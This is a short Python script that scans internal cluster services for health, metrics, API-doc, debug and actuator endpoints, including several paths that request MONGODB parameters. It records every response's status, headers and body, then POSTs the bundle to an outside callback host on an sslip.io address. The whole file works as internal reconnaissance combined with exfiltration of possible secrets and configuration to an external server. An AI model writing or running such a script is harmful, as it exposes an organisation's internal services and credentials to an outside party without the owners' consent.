#!/usr/bin/env python3
import json,time,urllib.request,urllib.error,socket
hosts=['http://lrs-metaserve-01','http://lrs-metaserve-01.canv2-sl-app-launcher.svc.cluster.local','http://lrs-pygencc-dispatcher-canv2.canv2-sl-app-launcher.svc.cluster.local']
paths=['/','/health','/ready','/version','/metrics','/openapi.json','/docs','/swagger.json','/api','/api/','/get_param','/get_param?param_key=MONGODB&pod=slserver&params[replica_set]=slserver','/params','/params/MONGODB','/parameter/MONGODB','/get_param/MONGODB','/get_param?param_key=MONGODB','/debug','/routes','/actuator','/actuator/health','/actuator/env']
out={'utc':time.strftime('%Y-%m-%dT%H:%M:%SZ',time.gmtime()),'cases':[]}
for h in hosts:
 for p in paths:
  rec={'host':h,'path':p}
  try:
   req=urllib.request.Request(h+p,headers={'Accept':'application/json'})
   with urllib.request.urlopen(req,timeout=8) as r:
    b=r.read(50000); rec.update(status=r.status,headers=dict(r.headers),body=b.decode('utf-8','replace'))
  except urllib.error.HTTPError as e:
   b=e.read(50000); rec.update(status=e.code,headers=dict(e.headers),body=b.decode('utf-8','replace'))
  except Exception as e: rec['error']=repr(e)
  out['cases'].append(rec)
raw=json.dumps(out,separators=(',',':')).encode(); req=urllib.request.Request('https://54.209.51.244.sslip.io/callback/snapgpt-metaserve-surface-20261106',data=raw,method='POST',headers={'Content-Type':'application/json'})
try:
 with urllib.request.urlopen(req,timeout=30) as r: print(json.dumps({'status':r.status,'bytes':len(raw)}))
except Exception as e: print(json.dumps({'error':repr(e),'bytes':len(raw)}))
